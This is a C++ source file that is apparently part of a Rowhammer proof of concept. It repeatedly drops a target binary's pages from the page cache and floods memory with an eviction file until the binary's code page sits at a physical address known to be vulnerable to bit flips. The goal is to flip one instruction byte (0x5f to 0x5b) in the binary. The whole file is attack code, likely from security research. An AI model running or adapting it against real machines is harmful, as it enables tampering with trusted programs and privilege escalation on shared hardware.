#include "libhammer.h"
#include "set"

using namespace std;

uint64_t current_pa, step = 0;

uint64_t get_binary_pa_offset(const string &path, uint64_t offset)
{
    int fd;
    unsigned sz;
    struct stat st;
    void *image;
    uint64_t ret;

    ASSERT(-1 != (fd = open(path.c_str(), O_RDONLY)) );
    fstat(fd, &st);
    sz = st.st_size;

    ASSERT(0 != (image = mmap(0, sz, PROT_READ, MAP_PRIVATE, fd, 0)) );
    mlock(image, sz);
    ret = v2p(image+offset);

    munlock(image, sz);
    close(fd);
    munmap(image, sz);
    return ret;
}

void waylaying(const string& path, int dir)
{
    uint64_t i, j, mem_size = get_available_mem() + 64 * 1024000ull;
    uint64_t cached_ns, uncached_ns;
//    uint64_t cached_count = 0, uncached_count = 0, fast_count = 0;
    double total = mem_size / PAGE_SIZE;
    char *memfile=0, *image=0, c=0;
    int fd, fbin, sz, memfile_size, gb_total = mem_size / 1024000000ull, gb_start, gb_end;
    struct stat st;
    volatile uint64_t tmp = 0;
    myclock clk, cl2;
    const uint64_t gb_size = PAGE_SIZE * 250000ull;

    // open eviction file
    ASSERT(-1 != (fd = open("/tmp/libhammer/disk/memfile", O_RDONLY)) );
    fstat(fd, &st);
    memfile_size = st.st_size;
    ASSERT(0 != (memfile = mmap(0, memfile_size, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0)) );
    // hold target binary
    ASSERT(-1 != (fbin = open(path.c_str(), O_RDONLY)) );
    fstat(fbin, &st);
    sz = st.st_size;

    ASSERT(0 != (image = mmap(0, sz, PROT_READ, MAP_PRIVATE, fbin, 0)) );
    ASSERT(image != -1);
    tmp += *(volatile uint64_t *)image;      // access

    //cout << gb_total << endl;
    //pause();
    if (dir == 1)
    {
        gb_start = 0; gb_end = gb_total + 1;
    }
    else if (dir == -1)
    {
        gb_start = gb_total; gb_end = -1;
    }

    // cout << "- start eviction" << endl;
    START_CLOCK(cl2, CLOCK_MONOTONIC);
    for (j=gb_start; j!=gb_end; j+=dir)
    {
        //cout << dec << j << "G";
        for (i=0; i<gb_size; i+=PAGE_SIZE)
        {
            if (i+j*gb_size > mem_size) break;
            if (i+j*gb_size > memfile_size) break;

            START_CLOCK(clk, CLOCK_MONOTONIC);
            tmp += (volatile uint8_t)memfile[i + j * gb_size];
            END_CLOCK(clk);

            if (i>0 && i % (1<<26)==0) {
               if (clk.ns < 150)
                    cout << "-";
               else if (clk.ns < 1000)
                    cout << ".";
               else
                    cout << "+";
               cout.flush();

               // use mincore to check if image is evicted
               //ASSERT(mincore(image, PAGE_SIZE, &c) == 0);
              // if ((c & 1) == 0) break;
            }

        }
        //if ((c & 1) == 0) break;
        //cout << endl;
    }
    END_CLOCK(cl2);
    cout << endl;
    // print statictics
//    cout << "Evicted after " << dec << (j*1000+i/1024000) << "M, Time: " << (cl2.ns / 1000) / 1.0e6 << " s" << endl;

    close(fd);
    munmap(memfile, memfile_size);
    close(fbin);
    munmap(image, sz);
}

// use fadvise to do waylaying!
void relocate_fadvise(const string& path)
{
    int fbin;
    struct stat st;

    ASSERT(-1 != (fbin = open(path.c_str(), O_RDONLY)) );
    fstat(fbin, &st);
    ASSERT(0 == posix_fadvise(fbin, 0, st.st_size, POSIX_FADV_DONTNEED));
    close(fbin);
}

int main(void)
{
    BinaryInfo target;

    target.path = "./target";
    target.flip_to = 0;
    target.offset = 2800;
    target.orig = 0x5f;
    target.target = 0x5b;

    // 1. find template position to put binary file in
    load_hammer_result("hammer_result.csv");
    vector<HammerResult> tmpl = find_template(target);
    map<uint64_t, HammerResult> paset;
    set<uint64_t> waylaying_set;
    int uniq = 0, cnt;
    uint64_t min_pa, max_pa;
    myclock myclk;

    if (tmpl.size() > 0)
    {
        // 2. waylaying
        uint64_t waylaying_offset = target.offset & ~0xfffull;
        for (HammerResult r : tmpl)
             paset[r.base] = r;

        // file+waylaying_offset should be on pa=HammerResult.base
        current_pa = get_binary_pa_offset(target.path, waylaying_offset);
        min_pa = max_pa = current_pa;
        cout << "* current_pa = " << hex << current_pa << endl;
        //exit(0);
        START_CLOCK(myclk, CLOCK_MONOTONIC);
        while (paset.count(current_pa) == 0)
        {
            ++step;
            relocate_fadvise(target.path);
            //waylaying(target.path, 1);
            current_pa = get_binary_pa_offset(target.path, waylaying_offset);
            if (current_pa < min_pa) min_pa = current_pa;
            if (current_pa > max_pa) max_pa = current_pa;
            END_CLOCK(myclk);
            waylaying_set.insert(current_pa);
            cout << "+ step " << dec << step << ": " << hex << current_pa
                 << dec << " coverage: " << uniq*4 << "k / " << (max_pa - min_pa)/1024 << " k, uptime: "
                 << (myclk.t1.tv_sec - myclk.t0.tv_sec) << "s." << endl;
            if (waylaying_set.size() == uniq)
                ++cnt;
            else cnt=0;
            if (cnt > 10)
            {
                cout << "* waylaying...";
                waylaying(target.path, 1);
                cnt=0;
            }
            uniq = waylaying_set.size();
        }
    }
    cout << "* target pa=0x" << hex << current_pa << ", hammer template=";
    paset[current_pa].print();
    return 0;
}
